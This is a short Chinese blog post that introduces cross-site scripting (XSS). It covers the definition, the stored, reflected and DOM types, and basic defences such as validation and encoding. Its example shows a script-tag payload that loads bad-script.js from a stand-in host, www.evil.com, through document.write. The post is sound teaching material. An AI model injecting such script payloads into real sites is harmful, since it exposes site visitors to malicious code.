---
layout: post
title: XSS-web 安全
date:  2018-09-26 08:56:29 +0800
categories: [Web]
tags: [web, web-safe, sh]
published: true
excerpt: web 安全之跨站脚本攻击
---

# XSS

## 命名

Cross Site Script（XSS， 跨站脚本攻击)

为什么叫 XSS，缩写明显是 CSS 啊？

没错，为了防止与我们熟悉的 CSS（Cascading Style Sheets）混淆，所以干脆更名为 XSS。

## 定义

那 XSS 是什么呢？

一言蔽之，XSS 就是攻击者在 Web 页面中插入恶意脚本，当用户浏览页面时，促使脚本执行，从而达到攻击目的。

XSS 的特点就是想尽一切办法在目标网站上执行第三方脚本。

ps: 就算不是恶意的，比如用户无心输入 `<>`。如果没有措施，也会导致显示混乱。

# 案例

举个例子。原有的网站有个将数据库中的数据显示到页面的上功能，`document.write("data from server")`。

但如果服务器没有验证数据类型，直接接受任何数据时，攻击者可以会将 `<script src='http:bad-script.js'></scirpt>` 当做一个数据写入数据库。

当其他用户请求这个数据时，网站原有的脚本就会执行 `document.write("<script src='http://www.evil.com/bad-script.js'></scirpt>"`)，

这样，便会执行 bad-script.js。

如果攻击者在这段第三方的脚本中写入恶意脚本，那么普通用户便会受到攻击。

# 类型

XSS 主要有三种类型：

## 存储型 XSS

注入的脚本永久的存在于目标服务器上，每当受害者向服务器请求此数据时就会重新唤醒攻击脚本；

## 反射型 XSS

当用受害者被引诱点击一个恶意链接，提交一个伪造的表单，恶意代码便会和正常返回数据一起作为响应发送到受害者的浏览器，从而骗过了浏览器，使之误以为恶意脚本来自于可信的服务器，以至于让恶意脚本得以执行。

## DOM 型 XSS

有点类似于存储型 XSS，但存储型 XSS 是将恶意脚本作为数据存储在服务器中，每个调用数据的用户都会受到攻击。

但 DOM 型 XSS 则是一个本地的行为，更多是本地更新 DOM 时导致了恶意脚本执行。

# 防御

1. 从客户端和服务器端双重验证所有的输入数据，这一般能阻挡大部分注入的脚本

2. 对所有的数据进行适当的编码

3. 设置 HTTP Header： "X-XSS-Protection: 1"

# 参考资料

[Web 安全入门之常见攻击](https://zhuanlan.zhihu.com/p/23309154)

[xss-tutorial](https://hackertarget.com/xss-tutorial/)

* any list
{:toc}